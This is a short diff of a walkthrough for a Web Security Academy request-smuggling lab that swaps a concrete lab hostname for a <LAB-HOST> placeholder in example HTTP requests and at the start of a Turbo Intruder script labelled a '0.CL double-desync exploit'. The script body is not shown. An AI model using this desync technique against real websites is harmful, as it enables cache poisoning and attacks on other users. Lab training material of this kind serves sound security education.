@@ -52,7 +52,7 @@ This is the request you’ll send to Turbo Intruder as the seed.
 
    ```http
    GET / HTTP/1.1
-   Host: 0af300c803a434bc80ae034e00ad0089.web-security-academy.net
+   Host: <LAB-HOST>.web-security-academy.net
    User-Agent: foo
    Accept: text/html
    Connection: close
@@ -71,7 +71,7 @@ This Repeater tab is now your **launchpad** for Turbo Intruder.
 
    ```http
    GET /resources/labheader/js/labHeader.js HTTP/1.1
-   Host: 0af300c803a434bc80ae034e00ad0089.web-security-academy.net
+   Host: <LAB-HOST>.web-security-academy.net
    ```
 
 3. Confirm you get a 200 with the JS payload.
@@ -99,8 +99,8 @@ In the Turbo Intruder script pane:
 ```python
 # 0.CL double-desync exploit – using real static gadget path
 
-host = '0af300c803a434bc80ae034e00ad0089.web-security-academy.net'  # current lab host
-GADGET_PATH = '/resources/labheader/js/labHeader.js'                # from lab traffic
+host = '<LAB-HOST>.web-security-academy.net'                        # <<< EDIT per lab
+GADGET_PATH = '/resources/labheader/js/labHeader.js'                # <<< Can optionally edit, or leave as is if matching real traffic
 
 def queueRequests(target, wordlists):
     engine = RequestEngine(
